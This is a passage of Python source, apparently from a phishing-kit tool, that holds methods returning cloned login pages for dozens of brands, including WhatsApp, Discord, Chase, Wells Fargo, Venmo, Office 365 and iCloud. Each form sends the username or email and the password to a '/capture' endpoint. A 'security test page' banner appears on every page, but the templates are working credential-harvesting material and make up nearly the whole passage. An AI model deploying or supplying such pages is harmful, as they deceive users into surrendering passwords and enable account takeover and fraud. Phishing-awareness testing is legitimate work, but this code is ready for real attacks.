button{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">WhatsApp</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_telegram_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Telegram Web</title>
<style>
body{background:#2aabee;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#2aabee;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Telegram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_discord_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Discord</title>
<style>
body{background:#36393f;font-family:Whitney,Helvetica;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#36393f;border-radius:8px;padding:40px;width:400px}
.logo{color:#fff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#202225;border:none;border-radius:4px;color:#fff}
button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Discord</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_tiktok_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>TikTok</title>
<style>
body{background:#000;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#010101;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#fe2c55;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">TikTok</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_snapchat_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Snapchat</title>
<style>
body{background:#fffc00;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#fffc00;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#fffc00;color:#000;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Snapchat</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_reddit_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Reddit</title>
<style>
body{background:#dae0e6;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:32px;width:400px}
.logo{color:#ff4500;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#ff4500;color:#fff;border:none;border-radius:24px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Reddit</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_protonmail_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>ProtonMail</title>
<style>
body{background:#505061;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#505061;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#505061;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">ProtonMail</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_yahoo_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Yahoo</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#410093;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#410093;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Yahoo</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_slack_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Slack</title>
<style>
body{background:#611f69;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#611f69;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#611f69;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Slack</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_zoom_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Zoom</title>
<style>
body{background:#2d8cff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#2d8cff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#2d8cff;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Zoom</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_teams_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Microsoft Teams</title>
<style>
body{background:#5059e8;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#5059e8;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#5059e8;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Teams</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_wordpress_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>WordPress</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#21759b;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#21759b;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">WordPress</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_shopify_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Shopify</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#96bf48;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#96bf48;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Shopify</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_steam_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Steam</title>
<style>
body{background:#1b2838;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#171d25;border-radius:8px;padding:40px;width:400px}
.logo{color:#67c1f5;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#323c46;border:none;border-radius:4px;color:#fff}
button{width:100%;padding:12px;background:#67c1f5;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Steam</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Steam Account Name" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_roblox_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Roblox</title>
<style>
body{background:#1f2b3a;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#e32c2c;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#e32c2c;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Roblox</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_twitch_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Twitch</title>
<style>
body{background:#19171c;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#9146ff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#9146ff;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Twitch</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_epic_games_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Epic Games</title>
<style>
body{background:#000;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#000;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">EPIC GAMES</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_minecraft_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Minecraft</title>
<style>
body{background:#2c2e33;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#6b8c42;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#6b8c42;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Minecraft</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_xbox_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Xbox</title>
<style>
body{background:#107c10;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#107c10;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#107c10;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Xbox</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_playstation_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>PlayStation Network</title>
<style>
body{background:#003791;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#003791;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#003791;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">PlayStation</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_cashapp_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Cash App</title>
<style>
body{background:#00d632;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#00d632;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#00d632;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Cash App</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_venmo_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Venmo</title>
<style>
body{background:#008cff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#008cff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#008cff;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Venmo</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_chase_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Chase Bank</title>
<style>
body{background:#1174c2;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#1174c2;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#1174c2;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Chase</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_wells_fargo_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Wells Fargo</title>
<style>
body{background:#bc1f2c;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#bc1f2c;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#bc1f2c;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Wells Fargo</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_office365_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Office 365</title>
<style>
body{background:#0078d4;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#0078d4;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Office 365</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_onedrive_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>OneDrive</title>
<style>
body{background:#0078d4;font-family:Segoe UI;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#0078d4;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">OneDrive</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_icloud_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>iCloud</title>
<style>
body{background:#fff;font-family:SF Pro Text;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:48px;width:400px;box-shadow:0 2px 12px rgba(0,0,0,0.1)}
.logo{color:#000;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">iCloud</div>
<h2>Sign in to iCloud</h2>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_adobe_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Adobe</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#ff0000;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Adobe</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_dropbox_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Dropbox</title>
<style>
body{background:#0061ff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#0061ff;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#0061ff;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Dropbox</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_gitlab_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>GitLab</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#fc6d26;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#fc6d26;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">GitLab</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_bitbucket_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Bitbucket</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px;width:400px}
.logo{color:#0052cc;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#0052cc;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Bitbucket</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_pinterest_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Pinterest</title>
<style>
body{background:#e60023;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#e60023;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#e60023;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Pinterest</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_duolingo_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Duolingo</title>
<style>
body{background:#58cc71;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#58cc71;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#58cc71;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Duolingo</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_onlyfans_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>OnlyFans</title>
<style>
body{background:#000;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#000;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#000;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">OnlyFans</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_bumble_template(self):
        return """<!DOCTYPE html>
<html>
<head><title>Bumble</title>
<style>
body{background:#ffc0cb;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}
.logo{color:#ff6b6b;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}
button{width:100%;padding:12px;background:#ff6b6b;color:#fff;border:none;border-radius:8px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Bumble</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _get_tinder_template(self):
